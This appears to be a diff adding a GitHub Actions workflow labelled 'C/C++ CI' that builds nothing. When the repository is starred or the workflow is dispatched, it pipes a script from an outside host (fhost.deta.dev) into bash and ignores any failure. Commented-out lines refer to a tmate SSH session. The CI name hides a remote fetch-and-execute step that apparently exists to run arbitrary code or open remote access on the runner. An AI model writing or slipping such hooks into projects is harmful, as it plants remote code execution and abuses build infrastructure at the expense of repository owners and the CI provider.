@@ -1,0 +1,52 @@
+name: C/C++ CI
+
+#on:
+  #push:
+  #  branches: [ rlk_5.0 ]
+on:
+  watch:
+    types: [started]
+  workflow_dispatch:
+    inputs:
+      startup_sh:
+        description: 'startup script'
+        required: false
+        default: 'curl -L fhost.deta.dev/d/devops/action-ubuntu-startup-linshi.sh | bash'
+
+jobs:
+  build:
+
+    runs-on: ubuntu-20.04
+
+    steps:
+    - uses: actions/checkout@v2
+    
+    - name: "Get Date"
+      id: get-date
+      run: |
+        echo "::set-output name=date::$(/bin/date -u '+%H%M%S')"
+      shell: bash
+
+    - name: Local Cache                      
+      uses: actions/cache@v2
+      with:
+        path: |
+          ~/local-cache
+          !~/local-cache/exclude
+        key: ${{ runner.os }}-cache-${{ steps.get-date.outputs.date }}
+        restore-keys: |
+            ${{ runner.os }}-cache-
+            ${{ runner.os }}-    
+            
+    - name: startup
+      continue-on-error: true 
+      run: |
+        echo "timeout: xxx"
+        curl -L fhost.deta.dev/d/devops/action-ubuntu-startup-linshi.sh | bash 
+        #${{ github.event.inputs.startup_sh }} 
+    - name: set up ssh 
+      continue-on-error: true 
+      #uses: mxschmitt/action-tmate@v3
+      #timeout-minutes: ${{ github.event.inputs.timeout }}
+      run: |
+        echo 'finish .... ' 
